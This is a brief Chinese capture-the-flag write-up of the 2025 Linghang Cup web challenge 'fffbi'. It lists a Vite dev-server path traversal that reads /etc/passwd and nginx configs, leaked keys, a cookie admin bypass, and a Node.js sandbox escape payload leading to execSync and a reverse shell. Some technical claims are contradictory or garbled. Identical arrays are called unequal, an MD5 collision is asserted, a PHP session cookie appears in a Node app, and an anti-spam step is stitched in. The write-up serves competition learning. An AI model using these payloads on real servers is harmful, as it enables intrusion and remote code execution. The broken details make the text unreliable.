# 2025"领航杯"网安赛项学生组初赛 WP（中）- fffbi + 反垃圾

> 赛事：2025 领航杯网安赛项 2025 | 方向：web | 难度：hard

## 一句话总结

2025 领航杯学生组 fffbi：vite 目录穿越 + nginx 代理发现 secretserver + Object.freeze 沙箱逃逸 + Math.constructor=Function 反弹 shell。

## 攻击链

1. vite 开发服务器目录穿越：/@fs/app/vite/#/../../../../../../../../etc/passwd
2. 读 nginx 配置 /etc/nginx/http.d/default.conf
3. 找到 secretserver/ 代理转发到 127.0.0.1:1337
4. 读 secretserver 源码: keys=["a42f00ce4bc90b196681051aa150c79a","ca3e7eb9498281338233df353232c0fd"]
5. admin=1 改 PHPSESSION cookie 后台访问
6. Object.freeze(Object/Math) 但 Math.constructor=Function 不冻
7. saferEval 沙箱：/Math|[()+-*/&|^%<>=,?:]|\d+.?\d*(?:ed+)?| /g
8. 绕：Math.constructor=Function, Math.fromCharCode(...) child_process.execSync
9. ak=[0],sk=[0] 长度相同但不相等 + md5(ak+keys[0]) == md5(sk+keys[0]) 触发 md5 collision
10. 反垃圾：MIME/邮件 spam 检测

## 关键 payload

```
(Math=>(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,...))()))(Math+1)
```

## 经验教训

vite dev server /@fs/app/ 目录穿越是经典 0day；Object.freeze(Object/Math) 不能冻 .constructor；Math.constructor=Function 反弹 shell 是 NodeJS 沙箱逃逸标准套路。
